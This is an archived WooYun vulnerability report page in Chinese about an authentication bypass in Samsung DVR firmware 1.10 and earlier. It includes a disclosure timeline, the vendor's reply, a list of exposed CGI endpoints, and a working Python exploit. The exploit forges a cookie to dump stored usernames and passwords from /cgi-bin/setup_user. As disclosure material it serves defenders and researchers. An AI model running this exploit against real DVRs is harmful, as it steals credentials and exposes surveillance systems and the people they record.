@@ -1,0 +1,258 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		三星硬盘录像机1.10权限绕过  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		三星硬盘录像机1.10权限绕过  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/0ctf">0ctf</a> 
+</li><li>提交时间：		2013-08-22 19:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-26：	细节向第三方安全合作伙伴开放<br/>
+									2013-09-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-12：	细节向普通白帽子公开<br/>
+									2013-10-02：	细节向实习白帽子公开<br/>
+									2013-11-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">三星硬盘录像机1.10以下所有版本远程访问权限绕过（附exp），可查本地摄像机配置，内容，登陆账号密码<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">三星录像机采用linux系统，存在一个外网登陆界面，通过httpd和CGI页面来验证用户cookie，分别为DATA1 DATA2 分为base64位编码的用户名和密码，由于CGI界面的一个错误验证导致cookie为任意参数都可以获取，设置，删除本地用户的用户名,密码cgi-bin/setup_user,设置DVR ,摄像机一般配置,信息的设备,存储,设置的NTP服务器,设置许多其他设置<br />
+<br />
+CGIs界面地址：<br />
+<br />
+</p><pre><code>/cgi-bin/camera_privacy_area<br />
+/cgi-bin/dev_camera<br />
+/cgi-bin/dev_devinfo<br />
+/cgi-bin/dev_devinfo2<br />
+/cgi-bin/dev_hddalarm<br />
+/cgi-bin/dev_modechange<br />
+/cgi-bin/dev_monitor<br />
+/cgi-bin/dev_pos<br />
+/cgi-bin/dev_ptz<br />
+/cgi-bin/dev_remote<br />
+/cgi-bin/dev_spotout<br />
+/cgi-bin/event_alarmsched<br />
+/cgi-bin/event_motion_area<br />
+/cgi-bin/event_motiondetect<br />
+/cgi-bin/event_sensordetect<br />
+/cgi-bin/event_tamper<br />
+/cgi-bin/event_vldetect<br />
+/cgi-bin/net_callback<br />
+/cgi-bin/net_connmode<br />
+/cgi-bin/net_ddns<br />
+/cgi-bin/net_event<br />
+/cgi-bin/net_group<br />
+/cgi-bin/net_imagetrans<br />
+/cgi-bin/net_recipient<br />
+/cgi-bin/net_server<br />
+/cgi-bin/net_snmp<br />
+/cgi-bin/net_transprotocol<br />
+/cgi-bin/net_user<br />
+/cgi-bin/rec_event<br />
+/cgi-bin/rec_eventrecduration<br />
+/cgi-bin/rec_normal<br />
+/cgi-bin/rec_recopt<br />
+/cgi-bin/rec_recsched<br />
+/cgi-bin/restart_page<br />
+/cgi-bin/setup_admin_setup<br />
+/cgi-bin/setup_datetimelang<br />
+/cgi-bin/setup_group<br />
+/cgi-bin/setup_holiday<br />
+/cgi-bin/setup_ntp<br />
+/cgi-bin/setup_systeminfo<br />
+/cgi-bin/setup_user<br />
+/cgi-bin/setup_userpwd<br />
+/cgi-bin/webviewer</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">py测试源码：<br />
+<br />
+</p><pre><code>#!/usr/bin/env python<br />
+#<br />
+#三星test<br />
+<br />
+import urllib2<br />
+import re<br />
+import sys<br />
+ <br />
+if __name__ == &quot;__main__&quot;:<br />
+ <br />
+    if len(sys.argv) != 2:<br />
+        print &quot;usage: %s [TARGET]&quot; % sys.argv[0]<br />
+        sys.exit(1)<br />
+ <br />
+    ip = sys.argv[1]<br />
+    headers = {&quot;Cookie&quot; : &quot;DATA1=YWFhYWFhYWFhYQ==&quot; }<br />
+ <br />
+    print &quot;SAMSUNG DVR Authentication Bypass&quot;<br />
+    print &quot;Vulnerability and exploit by Andrea Fabrizi &lt;andrea.fabrizi@gmail.com&gt;\n&quot;<br />
+    print &quot;Target =&gt; %s\n&quot; % ip<br />
+ <br />
+    #Dumping users<br />
+    print &quot;##### DUMPING USERS ####&quot;<br />
+    req = urllib2.Request(&quot;http://%s/cgi-bin/setup_user&quot; % ip, None, headers)<br />
+    response = urllib2.urlopen(req)<br />
+    user_found = False<br />
+ <br />
+    for line in response.readlines():<br />
+ <br />
+        exp = re.search(&quot;.*&lt;input type=\&#039;hidden\&#039; name=\&#039;nameUser_Name_[0-9]*\&#039; value=\&#039;(.*)\&#039;.*&quot;, line)<br />
+        if exp:<br />
+            print exp.group(1),<br />
+ <br />
+        exp = re.search(&quot;.*&lt;input type=\&#039;hidden\&#039; name=\&#039;nameUser_Pw_[0-9]*\&#039; value=\&#039;(.*)\&#039;.*&quot;, line)<br />
+        if exp:<br />
+            print &quot;: &quot; + exp.group(1)<br />
+            user_found = True<br />
+ <br />
+        exp = re.search(&quot;.*&lt;input type=hidden name=\&#039;admin_id\&#039; value=\&#039;(.*)\&#039;.*&quot;, line)<br />
+        if exp:<br />
+            print &quot;Admin ID =&gt; %s&quot; % exp.group(1)<br />
+ <br />
+     <br />
+    if not user_found:<br />
+        print &quot;No user found.&quot;</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/0ctf" title="0ctf">0ctf</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-035003" title="三星硬盘录像机1.10权限绕过">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2013-08-23 08:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对三星产品的关注，本漏洞我公司已发现，正在修复中。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="35003";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
